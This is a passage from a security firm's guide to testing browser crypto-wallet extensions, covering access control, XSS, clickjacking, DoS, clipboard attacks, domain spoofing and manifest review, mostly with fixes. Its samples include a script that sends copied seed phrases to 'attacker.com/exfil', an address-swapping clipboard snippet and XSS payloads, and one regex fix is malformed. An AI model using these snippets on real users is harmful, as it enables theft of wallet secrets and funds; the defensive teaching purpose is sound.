</span></span></code></pre></div></li><li><p><strong>Heap Snapshot Inspection :</strong> DevTools → Memory → Heap Snapshot and search maybe: <code>privateKey</code>, <code>mnemonic</code>, <code>seed</code>, <code>Uint8Array</code>, etc. or manually inspect it to check if key is leaked in there.</p></li><li><p><strong>Background Page Memory :</strong> Go to <code>chrome://extensions</code> → Make sure your Developer mode is turned on → Click the extension’s “Details” → “Inspect Views: Service Worker”. Catch the key in memory before it shuts down. This is time-sensitive process.</p></li><li><p><strong>Check Leak Lifespan</strong>: Also make sure that the once the private key is loaded to variable it should be immidately cleared so that it never remains in memory. For example, in below example code snippet the privKey is not cleared and remains in scope. <strong>:</strong></p></li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-jsx data-lang=jsx><span style=display:flex><span><span style=color:#75715e>// ❌ BAD PRACTICE
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>signTx</span>(<span style=color:#a6e22e>msg</span>) {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>privKey</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;0x123456abcdef...&#34;</span>; <span style=color:#75715e>// stays in memory!
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>sig</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>signWithPrivateKey</span>(<span style=color:#a6e22e>privKey</span>, <span style=color:#a6e22e>msg</span>);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>sig</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// ✅ GOOD PRACTICE
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>signTx</span>(<span style=color:#a6e22e>msg</span>) {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>privKey</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>decryptKey</span>(); <span style=color:#75715e>// returns Uint8Array
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>sig</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>signWithPrivateKey</span>(<span style=color:#a6e22e>privKey</span>, <span style=color:#a6e22e>msg</span>);
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>privKey</span>.<span style=color:#a6e22e>fill</span>(<span style=color:#ae81ff>0</span>); <span style=color:#75715e>// zero out after use
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>sig</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h2 id=4-broken-access-control>4. <strong>Broken Access Control</strong></h2><p>Broken Access Control (BAC) occurs when users can perform actions outside of their intended privileges like accessing or modifying another user&rsquo;s wallet data, signing without consent, or interacting with unauthorized internal APIs, seeing other users secret info.</p><p>Broken access control occurs when wallets fail to properly enforce security boundaries across contexts like:</p><ul><li>Background scripts</li><li>DApps (via <code>window.ethereum</code>)</li><li>Service workers</li><li>Chrome messaging (<code>chrome.runtime.sendMessage</code>)</li><li>UI components (popups, notifications, sign requests)</li></ul><p>These flaws can lead to <strong>unauthorized account access, transaction signing, or even full key exposure</strong>.</p><h3 id=41-idor-insecure-direct-object-reference>4.1 IDOR (Insecure Direct Object Reference)</h3><p>So consider a fact that there is API calls being made to fetch the user details including PII details such as email, username, phone number, secrets etc. to the following API route :</p><p><code>GET /users/10000/details</code>
****Now you know that, <code>10000</code> is your user id, what you do is change it to someone else’s like :</p><p><code>GET /users/10001/details</code></p><p>And boom! You’re presented with the data of <code>10001</code> user id. This is the basic gist covering technical breakdown of IDOR, there are multiple bypass to this depending on context, Content-type or where the id’s are passed in. However that is not included in here, it’s for you to search and explore further</p><h3 id=42-unauthorized-message-or-transaction-signing-without-user-interaction>4.2 Unauthorized Message or Transaction Signing without user interaction</h3><p>One of the most critical attack vectors in browser wallet security is the ability to sign transactions or messages without user consent. Wallets must explicitly gate signing functionality behind secure prompts and user approval, otherwise attackers can manipulate internal APIs or message flows to trigger signing silently.
So the Wallets must <strong>prompt users</strong> before signing messages (EIP-191) or typed data (EIP-712). If these prompts can be bypassed, attackers can perform <strong>silent transaction or message signing</strong>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-jsx data-lang=jsx><span style=display:flex><span><span style=color:#66d9ef>await</span> window.<span style=color:#a6e22e>ethereum</span>.<span style=color:#a6e22e>request</span>({
</span></span><span style=display:flex><span>   <span style=color:#a6e22e>method</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;eth_signTypedData_v4&#34;</span>,
</span></span><span style=display:flex><span>   <span style=color:#a6e22e>params</span><span style=color:#f92672>:</span> [<span style=color:#a6e22e>victimAddress</span>, <span style=color:#a6e22e>typedData</span>]
</span></span><span style=display:flex><span>});
</span></span></code></pre></div><p><strong>Testing Methodology :</strong></p><ul><li>Try signing from a previously authorized dApp (without re-approval)</li><li>Attempt signing during UI-locked state</li><li>Check if approvals are bound to origin</li></ul><p><strong>Fix</strong>:</p><ul><li>Require explicit user confirmation for all signing actions</li><li>Verify <code>origin</code>, <code>tabId</code>, and session status</li><li>Never auto-sign based on local storage</li></ul><h3 id=43--extension-apis-exposed-while-locked>4.3 Extension APIs Exposed While Locked</h3><p>When a wallet is locked, all APIs that expose sensitive data (e.g., accounts, balances, keys) must be disabled. If not, attackers can extract account info even while UI is locked.</p><p><strong>Attack Vector :</strong></p><p>For example , if anyone tried to call the extension when its locked by the following call:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-jsx data-lang=jsx><span style=display:flex><span><span style=color:#a6e22e>chrome</span>.<span style=color:#a6e22e>runtime</span>.<span style=color:#a6e22e>sendMessage</span>({ <span style=color:#a6e22e>method</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;getAccounts&#34;</span> });
</span></span></code></pre></div><p>Then there should not be any response or should respond with Error, Bad Request etc.</p><p><strong>Fix:</strong></p><ul><li>Implement a global <code>isLocked</code> state in background</li><li>Guard all entry points in service workers or background pages</li><li>Never rely on UI state alone</li></ul><h3 id=44-performing-sensitive-functions-without-user-confirmation>4.4 Performing sensitive functions without user confirmation</h3><p>Some wallets auto-switch Ethereum networks or selected accounts without user confirmation (entering passowrd), allowing dApps to mislead users or trick them into signing on malicious mainnets, changing PIN etc. leading to funds theft or loss of control for victims.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-jsx data-lang=jsx><span style=display:flex><span><span style=color:#66d9ef>await</span> <span style=color:#a6e22e>ethereum</span>.<span style=color:#a6e22e>request</span>({
</span></span><span style=display:flex><span><span style=color:#a6e22e>method</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;wallet_switchEthereumChain&#39;</span>,
</span></span><span style=display:flex><span><span style=color:#a6e22e>params</span><span style=color:#f92672>:</span> [{ <span style=color:#a6e22e>chainId</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;0x1&#39;</span> }], 
</span></span><span style=display:flex><span>});
</span></span></code></pre></div><p><strong>Fix (Secure Handling):</strong></p><ul><li>Prompt User before switching chain or account.</li><li>Show a full-screen modal with origin + chain + account</li></ul><h2 id=5-cross-site-scripting>5. <strong>Cross Site Scripting</strong></h2><p>Cross Site Scripting (XSS) is an attack vector which involves supplying malicious HTML/Javascript and performing some malicious actions on-behalf of the victim by transporting their cookies, localStorage, sessionStorage leading to account takeover. This could also be used in phishing users, or modifying DOM to trick users into approving malicious contracts.</p><p><strong>Attack Scenarios :</strong></p><ol><li><p>NFT integration : There are multiple integrations in the crypto wallet extensions which helps in integrating NFT. So NFT contains metadata, name and symbol. For testing, supply malicious JS payloads (for testing purpose) - <code>&lt;img src=x onerror=alert(123)></code> .</p><p>The above payload is to reference image, from the <code>src</code> : <code>x</code> , which is ofcourse invalid URL/URI. So <code>onerror</code> event handler will be triggered which will cause the alert popup execute like :</p><p><img src=/images/xss.png alt=image.png></p></li><li><p>dApp integration : If you integrate dApp with the crypto wallet protocol, and if the dApp actually contains an XSS like <code>https://target-dapp.com/search?q=&lt;script>alert(1)&lt;/script></code> this would cause XSS in the crypto wallet extensions as well.</p></li></ol><p><strong>Testing Methodology :</strong></p><ol><li>Check all the integrations like NFT, dApp, and other integrations in the crypto wallet.</li><li>Test with basic html payload like <code>“>&lt;h1>tester&lt;/h1></code> , <code>">&lt;img src=x onerror=alert(123)></code></li><li>If the payloads execute, it’s amazing. If not, you can maybe try bypass methods by supplying different encodings, event handlers, whitelist/blacklist bypass etc. and inspecting it via Dev Tools via Inspect.</li></ol><p><strong>Fix:</strong></p><ol><li>Sanitize NFT metadata, DeFi content, or user-supplied data before rendering</li><li>Use frameworks that auto-escape HTML (React, Vue)</li><li>Never use <code>innerHTML</code> or <code>document.write</code> on untrusted content</li><li>Harden the CSP configuration to minimize the impact.</li></ol><h2 id=6-clickjacking-attack>6. <strong>Clickjacking Attack</strong></h2><p><strong>Clickjacking</strong> (UI redressing) is a malicious technique where a victim is tricked into clicking on an element on a web page that is invisible or disguised as another element. When applied to crypto wallets, this could mean tricking a user into:</p><ul><li>Approving a transaction</li><li>Connecting their wallet</li><li>Signing a malicious message</li><li>Changing wallet settings</li><li>Stealing Private Key</li></ul><p><strong>Testing Methodology</strong> :</p><ol><li>Intercept the request via Network tab, or via Burp Suite</li><li>User is authenticated or has unlocked wallet in browser context.</li><li>Wallet uses iframe-accessible buttons or modals (e.g., MetaMask connect, transaction approval). And in the response tag of the files or endpoints you want to redress, check that <code>X-Frame-Options</code> doesn’t exists in the response header</li></ol><p>Fix:
The below example is that of “Brave Wallet” extension which is secured. In here, <code>X-Frame-Options: DENY</code> means no iframe origin can wrap it.</p><p><img src=/images/cj.png alt="Clickjacking attack"></p><h2 id=7-denial-of-service-dos>7. <strong>Denial of Service (DoS)</strong></h2><p>A <strong>Denial-of-Service (DoS)</strong> attack in the context of Web3 wallets is an intentional attempt to disrupt wallet operation, typically by overloading its API interfaces, UI layers, or background threads through aggressive or malformed interaction patterns. Rather than crashing servers, these attacks exploit weaknesses in <strong>extension-side handling of requests</strong>, often rendering the wallet <strong>unusable or unstable</strong> in the browser. Because Web3 wallets like MetaMask and Phantom expose a set of programmable JavaScript APIs directly to untrusted webpages (DApps), any site with access to <code>window.ethereum</code> or similar can invoke privileged methods that interact with the wallet’s internal components.</p><p>Unlike traditional APIs secured by authentication or permissioning, these interfaces assume good-faith behavior from DApps, making them vulnerable to <strong>unregulated abuse</strong>. The most common root cause of DoS in wallet extensions is the <strong>lack of per-origin rate limiting</strong>, allowing adversarial pages to flood wallet APIs with high-frequency or recursive calls, ultimately exhausting UI capacity, memory, or inter-process communication queues.</p><h3 id=71-lack-of-rate-limiting>7.1 Lack of rate-limiting</h3><p>In most wallet extensions today, there is little to no <strong>rate limiting</strong> applied to calls made from the DApp context to critical wallet methods. This leaves the system open to multiple forms of overload, ranging from <strong>popup flooding</strong> to <strong>silent background API abuse</strong>. Two interfaces particularly affected are:</p><ul><li><code>eth_requestAccounts</code> – triggers a wallet connection popup</li><li><code>wallet_watchAsset</code> – initiates background parsing and metadata processing</li></ul><p>These endpoints are callable repeatedly and without temporal restriction from any web origin where the wallet is injected. As a result, an attacker can script malicious loops or trigger automatic invocation chains on page load to overload the wallet&rsquo;s behavior.</p><p>If these functions, or any processing part (endpoint) is called continuously then the server load makes the extension go in Denial of service mode.</p><h3 id=72-improper-input-parsing>7.2 Improper input parsing</h3><p>Input validation is the core gist of security. It is common terminology, across all fields of cybersecurity - web2, web3, api, android app, iOS app etc. Many a times, there are instances where improper input could cause DoS. But this time, it’s time to think before reading ahead. It’s very simple, i bet.</p><p>So the below code is for listing the number of transactions in a page. For that, <code>?perPage</code> parameter is sent. So how can the attacker DoS such implementation.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-jsx data-lang=jsx><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>perPage</span> <span style=color:#f92672>=</span> Number(<span style=color:#a6e22e>options</span><span style=color:#f92672>?</span>.<span style=color:#a6e22e>perPage</span> <span style=color:#f92672>||</span> <span style=color:#a6e22e>defaultOptions</span><span style=color:#f92672>?</span>.<span style=color:#a6e22e>perPage</span>) <span style=color:#f92672>||</span> <span style=color:#ae81ff>20</span>;
</span></span></code></pre></div><p>You guessed it right, by passing a huge number like <code>100000000000</code> . So this implementation passed along with such value will put good load on the server and processing power. And in turn cause Denial of Service.</p><p><strong>ReDoS</strong>: Next up, is when developers try to parse regex based patterns as an user input. In here there are times when developers use unsafe <strong>regular expressions</strong>. This form of attack is called ReDoS - Regular Expression Denial of Service. It exploits the fact that certain poorly-written regex patterns can exhibit catastrophic backtracking, where evaluation time grows exponentially with input size, locking up the JavaScript engine, event loop, or even the browser tab.Consider a scenario where in the wallet extension, there is an symbol field NFT’s being prompted as an user input. And the regex used to parse it is : <code>/^([a-zA-Z]+)+$/</code></p><p>Can you spot the issue ? If you can, you’re amazing. If not, don’t worry i’ll make you. So the above regex pattern is scanning for letters lowercase and upper case are whitelisted. However the <code>+</code> sign denoted that the symbol length could be ≥1. So it could even be infinite.</p><p><strong>Fix</strong>: <code>/^([a-zA-Z]{1,10}$/</code> ⇒ this make sure that the letters are 1 ≤ 10.</p><h2 id=8-deceptive-uiux>8. <strong>Deceptive UI/UX</strong></h2><p>Deceptive UI/UX attacks exploit user interface design to mislead or manipulate wallet users into unintentionally approving dangerous actions. In browser-based crypto wallet, these attacks are highly effective because the wallet interfaces are embedded within or tightly integrated with the browser window, allowing adversaries to visually mimic, overlay, or redirect wallet operations without user suspicion.</p><p>A DApp prompts a user to sign an innocent-looking message (e.g., “Login with Web3”), but the payload contains off-chain approvals, permit-style access, or encoded phishing messages. Wallets render minimal UI metadata, making it easy to disguise the operation’s intent.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-jsx data-lang=jsx><span style=display:flex><span><span style=color:#66d9ef>await</span> <span style=color:#a6e22e>ethereum</span>.<span style=color:#a6e22e>request</span>({
</span></span><span style=display:flex><span><span style=color:#a6e22e>method</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;personal_sign&#34;</span>,
</span></span><span style=display:flex><span><span style=color:#a6e22e>params</span><span style=color:#f92672>:</span> [<span style=color:#a6e22e>userAddress</span>, <span style=color:#a6e22e>maliciousPermitPayload</span>],
</span></span><span style=display:flex><span>});
</span></span></code></pre></div><p>The signing prompt shows “Sign this message to login”, but the message grants ERC20 <code>permit()</code> approval to attacker.</p><h2 id=9-clipboard-based-attacks>9. <strong>Clipboard Based Attacks</strong></h2><p>Clipboard-based attacks exploit the user’s reliance on copy-paste operations to either steal sensitive data e.g. private keys, recovery phrases In Web3 environments, the clipboard becomes a critical target during activities like:</p><ul><li>Importing seed phrases</li><li>Copying wallet addresses</li><li>Sending funds manually (pasting address into a DApp)</li></ul><p>Modern browsers restrict clipboard access, but when clipboard APIs are exposed during user gestures, a malicious DApp or website can read or overwrite clipboard data silently leading to stealthy, damaging exploits, in turn.</p><p><strong>Attack Scenarios :</strong></p><p>On some sites or during account import, users might copy-paste their seed phrase or private key. A malicious DApp can read this clipboard data using <code>navigator.clipboard.readText()</code> if the user has recently interacted with the page.</p><p><strong>Workflow</strong> :</p><ol><li>Victim pastes their seed phrase into an import field (after copying it from a password manager or file).</li><li>Attacker-embedded script uses clipboard read logic within a trusted-looking interface.</li><li>The sensitive data is silently exfiltrated to an attacker-controlled server through a script something like this :</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-jsx data-lang=jsx><span style=display:flex><span>document.<span style=color:#a6e22e>addEventListener</span>(<span style=color:#e6db74>&#34;click&#34;</span>, <span style=color:#66d9ef>async</span> () =&gt; {
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>data</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>navigator</span>.<span style=color:#a6e22e>clipboard</span>.<span style=color:#a6e22e>readText</span>();
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>data</span>.<span style=color:#a6e22e>includes</span>(<span style=color:#e6db74>&#34; &#34;</span>)) {
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>fetch</span>(<span style=color:#e6db74>&#34;https://attacker.com/exfil&#34;</span>, {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>method</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;POST&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>body</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>JSON</span>.<span style=color:#a6e22e>stringify</span>({ <span style=color:#a6e22e>seed</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>data</span> }),
</span></span><span style=display:flex><span>  });
</span></span><span style=display:flex><span> }
</span></span><span style=display:flex><span>});
</span></span></code></pre></div><p>The above demonstrates read based logic of secret keys, phrases. However there could also be write-based logic for the receipient address which could result in transferring funds to attackers address. But the attack’s likelihood is quite low but should be taken into account. Something like this could make the user paste this address into a send form (or another DApp), unknowingly sending funds to the attacker.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-jsx data-lang=jsx><span style=display:flex><span>document.<span style=color:#a6e22e>getElementById</span>(<span style=color:#e6db74>&#34;copy&#34;</span>).<span style=color:#a6e22e>addEventListener</span>(<span style=color:#e6db74>&#34;click&#34;</span>, <span style=color:#66d9ef>async</span> () =&gt; {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>attackerAddress</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;0xBADc0deBEEF1234567890&#34;</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>navigator</span>.<span style=color:#a6e22e>clipboard</span>.<span style=color:#a6e22e>writeText</span>(<span style=color:#a6e22e>attackerAddress</span>);
</span></span><span style=display:flex><span>});
</span></span></code></pre></div><h2 id=10-domain-based-issues>10. <strong>Domain based issues</strong></h2><p>Wallets, especially those integrated into browser-based environments or interacting with dApps, are inherently exposed to domain-level threats. These vulnerabilities often stem from misconfigured DNS records, improper trust assumptions about subdomains or third-party platforms, and insecure handling of external assets or identities. Attackers can exploit weaknesses in domain ownership, resolution, or rendering to hijack trust, serve malicious content, or redirect users to spoofed interfaces.</p><p>This section focuses on high-impact vectors such as subdomain takeover, homograph-based domain spoofing, insecure CORS policies, referrer leakage, and the misuse of identity systems like ENS. The goal is to identify how wallets may indirectly inherit or amplify risks introduced at the domain or infrastructure layer to eliminate the risk.</p><h3 id=101-subdomain-takeover>10.1 Subdomain Takeover</h3><p>Subdomain Takeover is a security vulnerability that occurs when a subdomain (e.g., <code>test.example.com</code>) points to an external service (e.g., GitHub Pages, AWS S3, Heroku) via a CNAME or ALIAS DNS record, but the external service is not claimed or no longer exists. An attacker can register or claim the resource and serve malicious content from the subdomain. This could also arise due to bad nameserver configuration and misconfigured DNS Zones.</p><p><img src=/images/st-fc.png alt="Subdomain takeover flowchart"></p><p><strong>Testing methodology (example):</strong></p><ol><li><code>dig 0xaudron.xyz</code> (just for example, i have provided my site details)</li></ol><p><img src=/images/dig.png alt="dig records of subdomain"></p><ol start=2><li>Based on the records like this points to CNAME record of <code>0xaudron.[github.io](http://github.io)</code> you can follow the guide below as to how to claim vulnerable services. For instance <code>github.io</code> has edge cases as it’s not always possible to take it over even if it’s not taken over.</li></ol><p>Checkout the list of services and how to claim (sub)domains with dangling DNS records - <a href=https://github.com/EdOverflow/can-i-take-over-xyz>https://github.com/EdOverflow/can-i-take-over-xyz</a></p><p>Tools : <a href=https://github.com/haccer/subjack>subjack</a>, <a href=https://github.com/shmilylty/OneForAll>OneForAll</a>, <a href=https://github.com/projectdiscovery/nuclei>nuclei</a></p><h3 id=102-dapp-spoofing-via-similar-urls>10.2 DApp Spoofing via Similar URLs</h3><p>This technique is primarily used to deceive users and is a common component of social engineering attacks. In this scenario, attackers register lookalike domains that closely resemble legitimate ones, tricking users into believing they are on a trusted site. These fake domains are then used to steal funds, harvest credentials, or scam users.</p><p><strong>Example:</strong></p><p>If the legitimate site is <code>vulndapp.com</code>, an attacker might register a deceptive domain like <code>vulndápp.com</code>. While the two appear nearly identical at a glance, the latter contains a special character (<code>á</code>) and is controlled by the attacker.</p><h3 id=103-cross-origin-resource-sharing-misconfiguration>10.3 Cross Origin Resource Sharing Misconfiguration</h3><p>Wallet applications (especially web-based wallets and browser extensions) often expose APIs or communicate with backend services. If these services are misconfigured with overly permissive CORS policies (e.g., <code>Access-Control-Allow-Origin: *</code>), it may allow untrusted websites to make authenticated or unauthorized cross-origin requests, leading to data leakage or wallet manipulation.</p><p><strong>Testing Methodology :</strong></p><ol><li>In the following calls to API or any endpoints where state updating, sensitive information disclosure, check by sending request with malicious/attacker controlled domain in <code>Origin</code> header, try with maybe <code>Origin: https://www.example.com</code></li></ol><p><img src=/images/cors.png alt=CORS></p><ol start=2><li>If in the response you see the following response headers ⇒</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-tex data-lang=tex><span style=display:flex><span>Access-Control-Allow-Origin: https://www.example.com
</span></span><span style=display:flex><span>Access-Control-Allow-Credentials: true
</span></span></code></pre></div><ol start=3><li>Then it’s vulnerable and you can continue the exploitation due to misconfigured policy allowing attackers to carry out privileged actions and retrieve sensitive information.</li></ol><p>Tool(s): <a href=https://github.com/s0md3v/Corsy>Corsy</a></p><h3 id=104-ens-domain-name>10.4 ENS Domain Name</h3><p>ENS (Ethereum Name Service) provides human-readable names (like <code>alice.eth</code>) that map to Ethereum addresses and other data. While it improves usability, it also introduces security risks that must be considered in wallet security assessments.</p><p><strong>10.4.1 ENS Resolution Issues</strong></p><p><strong>Improper ENS Resolution -</strong> Test with unregistered or expired names like <code>invalid.eth</code>. Wallet may still allow sending.</p><p><strong>Fix:</strong> Resolve ENS before allowing transactions. Block unresolved names.</p><p><strong>Cached ENS Results -</strong> Change the address of an ENS name after first resolving it. Wallet may use old data.</p><p><strong>Fix:</strong> Re-fetch ENS data before sensitive actions.</p><p><strong>Malicious Resolver Contracts -</strong> when protocol uses custom resolvers returning fake or incorrect data.</p><p><strong>Fix:</strong> Check if data is accepted only from trusted resolver contracts.</p><p><strong>10.4.2 ENS Name Spoofing & Visual Deception</strong></p><p><strong>Homoglyph Names -</strong> Create lookalikes like <code>vіtalik.eth</code> (Cyrillic). Wallet may not warn.</p><p><strong>Fix:</strong> Detect homoglyphs. Warn or flag suspicious names.</p><p><strong>Punycode / Unicode Spoofing -</strong> Use names like <code>xn--vitalik.eth</code> with hidden characters.</p><p><strong>Fix:</strong> Normalize and show decoded names. Flag ambiguous ones.</p><p><strong>Subdomain Impersonation-</strong> Register <code>support.wallet.eth</code> to appear official.</p><p><strong>Fix:</strong> Don’t inherit trust from parent names. Show full ENS.</p><p><strong>10.4.3 Identity & Ownership</strong></p><p><strong>Unverified ENS Ownership -</strong> Point <code>trusted.eth</code> to any address. Wallet may assume trust.</p><p><strong>Fix:</strong> Use EIP-4361 or other proof of ownership. Mark unverified names.</p><p><strong>Fake Identity Claims -</strong> Register names like <code>brand.eth</code> with no link to real orgs.</p><p><strong>Fix:</strong> Show verified status. Support on-chain or DNSSEC proofs.</p><p><strong>Reverse Lookup Spoofing -</strong> Set reverse record that doesn’t match forward.</p><p><strong>Fix:</strong> Only show ENS if reverse and forward match.</p><h3 id=105-social-media-handles-takeover>10.5 Social Media handles takeover</h3><p>Social media based handles are currently essential portion of the workflow, updates, assistance or support and brand reputation is judged based on the handle accounts. What if they are compromised ? Yep, you can phish the company’s users, worsen their reputations, do scams especially in web3 based apps. In here, the social refs, links which are attached are not created, updated, linked etc. with the same username as metioned. And hence attacker can sign up with the same username.</p><h2 id=11-best-security-policies>11. <strong>Best security policies</strong></h2><h3 id=111-autolock-function>11.1 Autolock function</h3><p>Wallet browser extensions, once unlocked, should automatically lock themselves after a defined period of inactivity. Failure to implement autolocking exposes users to session hijacking, especially on shared or compromised devices. Without autolock, sensitive operations like signing messages or transactions may remain accessible to unauthorized users.</p><p><strong>Testing Methodology :</strong></p><ul><li>Unlock the wallet extension and leave it idle.</li><li>Monitor session behavior over a period (e.g., 5–15 minutes) without interaction.</li><li>Attempt to trigger wallet actions (signing, viewing keys, sending transactions) after idle time.</li><li>Observe if the extension remains accessible without requiring reauthentication.</li></ul><p><strong>Fix:</strong></p><ul><li>Enforce autolock after a short inactivity period (e.g., 5 minutes).</li><li>Provide configurable timeout options for user convenience.</li><li>Require password or biometric verification to re-authenticate after lock.</li></ul><h3 id=112-password-policy>11.2 Password Policy</h3><p>Wallet extensions use passwords to encrypt private keys and secure local storage. A weak password policy allows users to set short, guessable, or common passwords, which weakens the overall cryptographic protection. Attackers with access to the local device or storage may attempt offline brute-force or dictionary attacks on the encrypted vault.
<strong>Recommendations :</strong></p><ul><li>Implement a strict password policy:<ul><li>Minimum length (e.g., 8–12 characters)</li><li>Mix of upper/lowercase letters, numbers, and symbols</li></ul></li><li>Assess password strength using entropy calculations or libraries like <a href=https://github.com/dropbox/zxcvbn>zxcvbn</a></li><li>Include a password strength meter during setup</li><li>Reject commonly used passwords and provide guidance for strong passphrase creation</li></ul><h2 id=12-manifest-file-misconfiguration>12. <strong>Manifest file Misconfiguration</strong></h2><p>The <code>manifest.json</code> file defines core extension behavior, permissions, and resource access. In wallet browser extensions, insecure or overly permissive configurations here can expose users to elevated risks. These include excessive access to browser APIs, content script injection on unintended domains, and insecure content security policies (CSP). If improperly configured, it may allow for privilege escalation, data leaks, or unauthorized interactions between the extension and malicious webpages.</p><p><img src=/images/manifest.png alt="example of manifest.json file"></p><p><strong>Testing Methodology :</strong></p><ul><li>Review the manifest file for permissions such as <code>tabs</code>, <code>webRequest</code>, or <code>host_permissions</code> with wide scopes like <code>&lt;all_urls></code> or <code>://*/*</code>.</li><li>Inspect <code>content_scripts</code> for overly broad <code>matches</code> rules. Scripts injecting on arbitrary domains should be flagged.</li><li>Validate the <code>content_security_policy</code> to ensure no unsafe directives like <code>'unsafe-eval'</code> or wildcards in <code>script-src</code>. You can also use <a href=https://csp-evaluator.withgoogle.com/>CSP Evaluator</a> by google.</li><li>Check background/service workers and messaging handlers (<code>chrome.runtime.onMessage</code>, <code>postMessage</code>) for origin checks.</li><li>Test if internal extension APIs are callable from web pages without restrictions.</li></ul><p><strong>Fix :</strong></p><ul><li>Limit permissions to the minimum required. Avoid broad scopes in <code>host_permissions</code>.</li><li>Restrict content scripts to specific, trusted domains only.</li><li>Define a strict CSP: use <code>script-src 'self'</code> and avoid external sources or eval-like constructs.</li><li>Always verify message sender origins before processing.</li><li>Prefer Manifest V3 with service workers for better isolation and control.</li></ul><p>Thanks for reading, hope you found it informative. For Wallet Security Pentests/Audits, feel free to <a href=https://t.me/ValkyriSecurity><strong>reach out to us</strong></a> or <a href=https://valkyri.xyz/#contact><strong>request quote</strong></a></p></div></article></main></div></div></main><footer class="bg-zinc-100 py-10 md:py-14"><div class=container><div class=footer-content><div class=footer-section><h3 style="font-family:lexend peta,roboto,helvetica,arial,sans-serif;font-weight:700">VALKYRI</h3><p style=padding-right:4rem>End-to-end Security built from the ground up - infrastructure, on-chain, and every layer in between</p></div><div class=footer-section><h3>Our Services</h3><ul style=list-style:none;color:var(--text-gray)><li><a href=#services style=color:var(--text-gray);text-decoration:none>Infrastructure Security</a></li><li><a href=#services style=color:var(--text-gray);text-decoration:none>Wallet Security</a></li><li><a href=#services style=color:var(--text-gray);text-decoration:none>Smart Contract Audit</a></li><li><a href=#services style=color:var(--text-gray);text-decoration:none>Mobile Application Pentest</a></li></ul></div><div class=footer-section><h3>Connect</h3><div class=social-links><a href=https://t.me/ValkyriSecurity title=Telegram><img src=/connect/telegram.png alt=Telegram width=20 height=20></a>
<a href=https://x.com/ValkyriSecurity title=Twitter><img src=/connect/x.png alt=X width=20 height=20></a>
<a href=mailto:contact@valkyri.xyz title=Email><img src=/connect/email.png alt=Email width=20 height=20></a></div></div></div><div class=footer-bottom><p>&copy; 2025 Valkyri Security. All rights reserved.</p></div></div></footer><script>document.addEventListener("DOMContentLoaded",function(){const e=document.querySelector(".hamburger"),t=document.querySelector("nav > .nav-links");e&&t&&(e.addEventListener("click",function(){t.classList.toggle("active"),e.classList.toggle("active")}),document.querySelectorAll("nav > .nav-links a").forEach(n=>{n.addEventListener("click",()=>{t.classList.remove("active"),e.classList.remove("active")})}),document.addEventListener("click",function(n){!e.contains(n.target)&&!t.contains(n.target)&&(t.classList.remove("active"),e.classList.remove("active"))}))})</script></body></html>